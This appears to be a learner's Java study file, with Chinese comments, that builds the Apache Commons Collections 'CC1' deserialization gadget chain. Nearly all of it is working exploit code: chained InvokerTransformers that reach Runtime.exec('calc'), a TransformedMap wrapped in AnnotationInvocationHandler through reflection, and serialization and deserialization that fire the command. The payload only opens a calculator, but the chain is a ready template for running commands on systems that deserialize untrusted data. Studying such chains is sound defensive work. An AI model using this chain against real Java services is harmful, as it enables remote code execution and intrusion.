package org.demo2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
//        Runtime.getRuntime().exec("calc");
//        Runtime r=Runtime.getRuntime();
//        Class c=Runtime.class;
//        Method execmethod=c.getMethod("exec",String.class);
//        execmethod.invoke(r,"calc"); 由于runtime是不能反序列化的而class是可以序列化
//          Class C=Runtime.class;
//         Method M=C.getMethod("getRuntime",null);
//         Runtime r=(Runtime) M.invoke(null,null);
//          Method exec=C.getMethod("exec",String.class);
//          exec.invoke(r,"calc");
//          Method getruntimeMethod=(Method)new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//          Runtime r=(Runtime)new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getruntimeMethod);
//          new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
          Transformer[] transformers=new Transformer[]{
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                  new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
          };
          ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
          //chainedTransformer.transform(Runtime.class);
//        InvokerTransformer invokerTransformer=new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","b");
        Map<Object,Object> transformedmap=TransformedMap.decorate(map,null,chainedTransformer);
//        for(Map.Entry entry:transformedmap.entrySet()){//这行代码使用增强的for循环（也称为"for-each"循环）来遍历HashMap的entrySet()。entrySet()方法返回一个包含HashMap中所有键值对（作为Map.Entry对象）的Set视图。
//                entry.setValue(r);
//             Object key = entry.getKey();
//            Object value = entry.getValue();
//            System.out.println("Key: " + key + ", Value: " + value);
//        }
        Class C=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");//因为无法直接实例化 所以通过类反射去实例化这个对象
        Constructor annotation =C.getDeclaredConstructor(Class.class,Map.class);
        annotation.setAccessible(true);
        Object o=annotation.newInstance(Target.class,transformedmap); //传入Target装饰器绕过
        serialize(o);
        unserialize("a.ser");
    }
    public static void serialize(Object object) throws Exception{
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("a.ser"));
        oos.writeObject(object);
    }
    public static void unserialize(String filename) throws Exception{
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }
}
